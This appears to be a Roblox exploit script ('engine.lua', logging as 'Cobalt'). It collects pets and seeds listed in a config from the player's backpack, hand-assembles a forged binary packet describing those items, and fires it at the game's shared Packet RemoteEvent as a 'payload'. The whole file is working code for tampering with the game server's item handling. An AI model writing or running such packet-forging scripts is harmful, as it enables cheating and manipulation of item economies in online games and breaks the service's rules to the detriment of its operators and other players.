-- engine.lua
return function(config)
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    local ReplicatedStorage = game:GetService("ReplicatedStorage")

    -- Use dynamic lists from config
    local petSet = {}
    for _, name in ipairs(config.pets or {}) do petSet[name:lower()] = true end

    local seedSet = {}
    for _, name in ipairs(config.seeds or {}) do seedSet[name:lower()] = true end

    -- ==========================================
    -- SCAN BACKPACK
    -- ==========================================
    local backpack = player:WaitForChild("Backpack", 5)
    if not backpack then
        warn("Cobalt: Backpack folder not found.")
        return
    end

    local scannedItems = {}
    for _, item in ipairs(backpack:GetChildren()) do
        local mainCategory = item:GetAttribute("MainCategory")
        
        if mainCategory == "Seed" then
            local seedTool = item:GetAttribute("SeedTool")
            if seedTool and seedSet[seedTool:lower()] then
                table.insert(scannedItems, {itemKey = seedTool, count = item:GetAttribute("Count") or 1, category = "Seeds"})
            end
        else
            local petName = item:GetAttribute("Pet")
            local petId = item:GetAttribute("PetId")
            if petName and petSet[petName:lower()] then
                table.insert(scannedItems, {itemKey = petId or "UnknownID", count = 1, category = "Pets"})
            end
        end
    end

    if #scannedItems == 0 then
        warn("Cobalt: No matching seeds or pets found.")
        return
    end

    -- ==========================================
    -- SERIALIZATION
    -- ==========================================
    local function smartEscape(str)
        local escaped = ""
        for i = 1, #str do
            local char = str:sub(i, i)
            local byteVal = string.byte(char)
            if char == "\\" then escaped = escaped .. "\\\\"
            elseif char == "\"" then escaped = escaped .. "\\\""
            elseif byteVal >= 32 and byteVal <= 126 then escaped = escaped .. char
            elseif char == "\t" then escaped = escaped .. "\\t"
            elseif char == "\n" then escaped = escaped .. "\\n"
            elseif char == "\r" then escaped = escaped .. "\\r"
            elseif char == "\v" then escaped = escaped .. "\\v"
            elseif char == "\a" then escaped = escaped .. "\\a"
            elseif char == "\b" then escaped = escaped .. "\\b"
            else escaped = escaped .. string.format("\\x%02X", byteVal) end
        end
        return escaped
    end

    local function encodeString(str)
        local sizeByte = string.format("\\x%02X", #str)
        if #str == 11 then sizeByte = "\\v" elseif #str == 7 then sizeByte = "\\a" end
        return "\\v" .. sizeByte .. smartEscape(str)
    end

    local function encodeNumber(num)
        local numByte = string.format("\\x%02X", num)
        if num == 11 then numByte = "\\v" elseif num == 7 then numByte = "\\a" end
        return "\\x05" .. numByte
    end

    local finalBufferString = "!\\x01\\x1C\\x00\\x00\\xC0\\x04\\xD6&\\xF0A\\x1C\\x05"
    for index, item in ipairs(scannedItems) do
        local indexByte = string.format("\\x%02X", index)
        if index == 11 then indexByte = "\\v" elseif index == 7 then indexByte = "\\a" end
        finalBufferString = finalBufferString .. indexByte .. "\\x1C"
        finalBufferString = finalBufferString .. encodeString("ItemKey") .. encodeString(item.itemKey)
        finalBufferString = finalBufferString .. encodeString("Count") .. encodeNumber(item.count)
        finalBufferString = finalBufferString .. encodeString("Category") .. encodeString(item.category)
        finalBufferString = finalBufferString .. "\\x00"
        if index < #scannedItems then finalBufferString = finalBufferString .. "\\x05" end
    end
    finalBufferString = finalBufferString .. "\\x00\\x00"

    -- ==========================================
    -- FIRE
    -- ==========================================
    local packetEvent = ReplicatedStorage:FindFirstChild("SharedModules")
        and ReplicatedStorage.SharedModules:FindFirstChild("Packet")
        and ReplicatedStorage.SharedModules.Packet:FindFirstChild("RemoteEvent")

    if packetEvent then
        local binaryStr = finalBufferString:gsub("\\x(%x%x)", function(hex) return string.char(tonumber(hex, 16)) end)
            :gsub("\\v", "\v"):gsub("\\a", "\a"):gsub("\\t", "\t"):gsub("\\n", "\n"):gsub("\\r", "\r"):gsub("\\b", "\b"):gsub("\\\\", "\\"):gsub('\\"', '"')
        local payloadBuffer = buffer.fromstring(binaryStr)
        packetEvent:FireServer(payloadBuffer)
        print("Cobalt: Payload fired successfully!")
    else
        warn("Cobalt: RemoteEvent not found.")
    end
end
